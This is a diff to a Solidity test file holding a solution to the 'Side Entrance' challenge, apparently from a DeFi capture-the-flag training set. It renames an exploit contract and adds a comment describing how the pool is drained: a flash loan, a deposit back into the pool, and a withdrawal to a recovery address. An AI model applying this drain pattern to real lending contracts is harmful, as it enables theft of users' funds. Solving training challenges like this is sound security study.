@@ -8,7 +8,7 @@ import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLender
 
 
 
- contract Attack {
+ contract Exploit {
     
     SideEntranceLenderPool pool;
     address payable receiver;
@@ -18,7 +18,8 @@ import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLender
         receiver = _receiver;
     }
 
-    function pepe(uint256 amount) external {
+
+    function exploit(uint256 amount) external {
         pool.flashLoan(amount);
         pool.withdraw();
         
@@ -73,8 +74,12 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        Attack att = new Attack(pool, payable(recovery));
-        att.pepe(ETHER_IN_POOL);
+        // Exploit: The exploiter contract takes a flash loan from the pool,
+        // deposits the borrowed amount back into the pool, and then withdraws all funds from the pool
+        // to the recovery address.
+
+        Exploit exploiter = new Exploit(pool, payable(recovery));
+        exploiter.exploit(ETHER_IN_POOL);
     }
 
     /**
